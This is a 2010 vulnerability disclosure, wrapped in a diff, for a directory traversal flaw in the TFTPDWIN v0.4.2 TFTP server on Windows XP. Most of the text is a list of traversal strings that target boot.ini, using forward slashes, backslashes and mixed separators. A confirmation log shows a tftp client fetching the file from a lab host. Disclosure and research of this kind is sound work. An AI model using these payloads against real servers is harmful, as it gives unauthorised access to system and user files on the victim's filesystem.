@@ -1,0 +1,118 @@
++------------------------------------------------------------------------+
+|                                 .......                                |
+|                         ..''xxxxxxxxxxxxxxx'...                        |
+|                    ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx..                    |
+|                 ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.                 |
+|               .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'.               |
+|             .'xxxxxxxxxxxxxxxxxxxxx''......        ...  ..             |
+|            .xxxxxxxxxxxxxxxxxx'...         ........      .'.           |
+|           'xxxxxxxxxxxxxxx'......                          '.          |
+|          'xxxxxxxxxxxxxx'..'x..                            .x.         |
+|         .xxxxxxxxxxxx'...'..                  ...           .'         |
+|         'xxxxxxxxx'..  .                          ..        .x.        |
+|         xxxxxxx'.                                  ..        x.        |
+|         xxxx'.                ....                  x        x.        |
+|         'x'.            ...'xxxxxxx'.               x       .x.        |
+|         .x'.         .'xxxxxxxxxxxxxx.             ''       .'         |
+|          .xx.      .'xxxxxxxxxxxxxxxx.           .'xx'''.  .'          |
+|           .xx..    'xxxxxxxxxxxxxxxx'          .'xxxxxxxxx''.          |
+|            .'xx'.  .'xxxxxxxxxxxxxxx.      ..'xxxxxxxxxxxx'            |
+|              .xxx'.  .xxxxxxxxxxxx'.    .'xxxxxxxxxxxxxx'.             |
+|                .xxxx'.'xxxxxxxxx'.      xxx'xxxxxxxxxx'.               |
+|                  .'xxxxxxx'....          ...xxxxxxx'.                  |
+|                     ..'xxxxx'..         ..xxxxx'..                     |
+|                          ....'xx'.....''''...                          |
+|                                                                        |
+|                    CubilFelino Security Research Labs                  |
+|                            proudly presents...                         |
++------------------------------------------------------------------------+
+
+
+Author: chr1x (chr1x@sectester.net)
+Date: August 30, 2010
+Affected operating system/software, including full version details
+* TFTP Server TFTPDWIN v0.4.2, Tested on Windows XP PRO SP3
+
+Download:
+http://www.prosysinfo.webpark.pl/sciagnij.html
+http://www.versiontracker.com/php/dlpage.php?id=10417389&db=win&pid=10417389&kind=&lnk=http://www.prosysinfo.com.pl/tftpserver/tftpdwin.exe
+
+How the vulnerability can be reproduced
+
+* Please, use the strings shown below to reproduce the issue.
+
+[*] Testing Path: ../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../../boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: ../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ../../../../../../../../boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: ..\..\..\..\..\..\..\..\boot.ini <- Vulnerable string!!
+[*] Testing Path: \../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../\../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../\../\../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: \../\../\../\../\../\../\../\../boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\/..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\/..\/..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\/..\/..\/..\/..\boot.ini  <- Vulnerable string!!
+[*] Testing Path: /..\/..\/..\/..\/..\/..\/..\/..\boot.ini  <- Vulnerable string!!
+
+Confirmation Log:
+
+root@olovely:/# tftp 192.168.1.53
+tftp> connect
+(to) 192.168.1.53
+tftp> ascii
+tftp> get
+(files) ..\..\..\..\..\..\..\boot.ini
+Received 211 bytes in 0.0 seconds
+tftp>
+
+
+What impact the vulnerability has on the vulnerable system
+Any additional details that might help in the verification process
+
+* High, since when exploiting the vulnerability the attacker is able to get full access to the victim filesystem.
